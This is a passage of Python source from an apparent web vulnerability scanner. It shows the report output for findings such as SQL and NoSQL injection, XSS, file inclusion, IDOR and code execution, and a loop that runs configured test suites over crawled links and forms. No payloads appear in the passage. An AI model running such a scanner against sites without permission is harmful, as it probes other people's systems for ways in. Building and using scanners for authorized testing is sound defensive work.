            print("[END] End of Local File Inclusion", file=self.report_file)

        if links_lfi_directory_transversal:
            print("\n[!!!---!!!] Local File Inclusion Directory Transversal on links:\n", file=self.report_file)
            print(*links_lfi_directory_transversal, sep="\n", file=self.report_file)
            print("[END] End of Local File Inclusion Directory Transversal", file=self.report_file)

        if links_cookie_directory_transversal:
            print("\n[!!!---!!!] Cookies Local File Inclusion Directory Transversal  on links:\n", file=self.report_file)
            print(*links_cookie_directory_transversal, sep="\n", file=self.report_file)
            print("[END] End of Cookie Local File Inclusion Directory Transversal", file=self.report_file)

        if links_bypass_authorization:
            print("\n[!!!---!!!] Bypassing Authorization Vulnerability:\n", file=self.report_file)
            print("Horizontal Bypassing Authorization on links:\n", file=self.report_file)
            print(*links_bypass_authorization, sep="\n", file=self.report_file)

        if links_special_header:
            print("[!!!---!!!] Special Request Header Handling on links:\n", file=self.report_file)
            print(*links_special_header, sep="\n", file=self.report_file)
            print("[END] End of Bypassing Authorization Vulnerability", file=self.report_file)

        if links_xee_vuln:
            print("\n[!!!---!!!] XEE Vulnerability found on links:\n", file=self.report_file)
            print(*links_xee_vuln, sep="\n", file=self.report_file)
            print("[END] End of XEE Vulnerable links", file=self.report_file)

        if links_xss_link:
            print("\n[!!!---!!!] XSS Vulnerability found on links:\n", file=self.report_file)
            print(*links_xss_link, sep="\n", file=self.report_file)
            print("[END] End of XSS Vulnerable links", file=self.report_file)

        if links_idor:
            print("\n[!!!---!!!] Insecure Direct Object References on links:\n", file=self.report_file)
            print(*links_idor, sep="\n", file=self.report_file)
            print("[END] IDOR Links", file=self.report_file)

        # Form Dependent Vulnerabilities

        print("\n\t\t[++]       Form Vulnerabilities       [++]\n", file=self.report_file)

        if links_forms_dict_xss:
            print("\n[!!!---!!!] XSS Vulnerabilities found:\n", file=self.report_file)
            for link in links_forms_dict_xss:
                print("Link:", link, "\nForm:\n", links_forms_dict_xss[link], file=self.report_file)
                print("------", file=self.report_file)

        if links_forms_dict_file_upload:
            print("\n[!!!---!!!] File Upload Vulnerabilities found:\n", file=self.report_file)
            for link in links_forms_dict_file_upload:
                print("Link:", link, "\nForm:\n", links_forms_dict_file_upload[link], file=self.report_file)
                print("------", file=self.report_file)

        if links_forms_dict_code_exec:
            print("\n[!!!---!!!] Code Execution Vulnerabilities found:\n", file=self.report_file)
            for link in links_forms_dict_code_exec:
                print("Link:", link, "\nForm:\n", links_forms_dict_code_exec[link], file=self.report_file)
                print("------", file=self.report_file)

        if links_forms_dict_sql_injection:
            print("\n[!!!---!!!] SQL Injection Vulnerabilities found:\n", file=self.report_file)
            for link in links_forms_dict_sql_injection:
                print("Link:", link, "\nForm:\n", links_forms_dict_sql_injection[link], file=self.report_file)
                print("[TIME]", file=self.report_file)
                print("Without SQL Payload: ", sql_injection_dict_normal[link], "s", file=self.report_file)
                print("With SQL Payload injected: ", sql_injection_dict_injected[link], "s", file=self.report_file)
                print("------", file=self.report_file)

        if links_forms_dict_nosql_injection:
            print("\n[!!!---!!!] NOSQL Injection Vulnerabilities found:\n", file=self.report_file)
            for link in links_forms_dict_nosql_injection:
                print("Link:", link, "\nForm:\n", links_forms_dict_nosql_injection[link], file=self.report_file)
                print("[TIME]", file=self.report_file)
                print("Without SQL Payload: ", nosql_injection_dict_normal[link], "s", file=self.report_file)
                print("With SQL Payload injected: ", nosql_injection_dict_injected[link], "s", file=self.report_file)
                print("------", file=self.report_file)

        if links_forms__dict_sensitive_info:
            print("\n[!!!---!!!] Sensitive Information might be transferred over unsecure form:\n", file=self.report_file)
            for link in links_forms__dict_sensitive_info:
                print("Link:", link, "\nForm:\n", links_forms__dict_sensitive_info[link], file=self.report_file)
                print("------", file=self.report_file)

        if links_forms_files_in_form:
            print("\n[!!!---!!!] Sensitive Information might be referenced in hidden form action:\n", file=self.report_file)
            for link in links_forms_files_in_form:
                print("Link:", link, "\nForm:\n", links_forms_files_in_form[link], file=self.report_file)
                print("------", file=self.report_file)

    def run_scanner(self):
        global final_list
        try:
            print('\rPlease wait..', end='', flush=True)
            self.gather_info()
            self.test_broken_auth(test=(True if config_object['TEST']['test_broken_auth'].lower() == "true" else False))
            self.test_security_misconfiguration(test=(True if config_object['TEST']['test_security_misconfiguration'].lower() == "true" else False))
            self.test_sensitive_data_exposure(test=(True if config_object['TEST']['test_sensitive_data_exposure'].lower() == "true" else False))

            visible_links, final_list = self.create_return_merge_links()
            for count, link in enumerate(final_list):
                try:

                    forms = self.extract_forms(link)
                    if count-1 == visible_links:
                        print("[!!!-!!!] Performing tests on hidden links now", file=self.report_file)

                    # Info Gathering
                    self.gather_info(link)

                    # Test Suites
                    self.test_injections(link, test=(True if config_object['TEST']['test_injection'].lower() == "true" else False))
                    self.test_broken_auth(link, test=(True if config_object['TEST']['test_broken_auth'].lower() == "true" else False))
                    self.test_sensitive_data_exposure(link, test=(True if config_object['TEST']['test_sensitive_data_exposure'].lower() == "true" else False))
                    self.test_xml_external_entities(link, test=(True if config_object['TEST']['test_xml_external_entities'].lower() == "true" else False))
                    self.test_broken_access_control(link, test=(True if config_object['TEST']['test_broken_access_control'].lower() == "true" else False))

                    # Form Specific Tests
                    for form in forms:
                        print("Found form on links: " + link, file=self.map_file)
                        self.test_injections(link, form, test=(True if config_object['TEST']['test_injection'].lower() == "true" else False))
                        self.test_sensitive_data_exposure(link, form, test=(True if config_object['TEST']['test_sensitive_data_exposure'].lower() == "true" else False))
                        self.test_security_misconfiguration(link, form, test=(True if config_object['TEST']['test_security_misconfiguration'].lower() == "true" else False))
                except Exception as e:
                    print(e)
                    pass

            self.print_report()
            print('\rDone', end='', flush=True)
        except Exception as e:
            print(e)
            pass
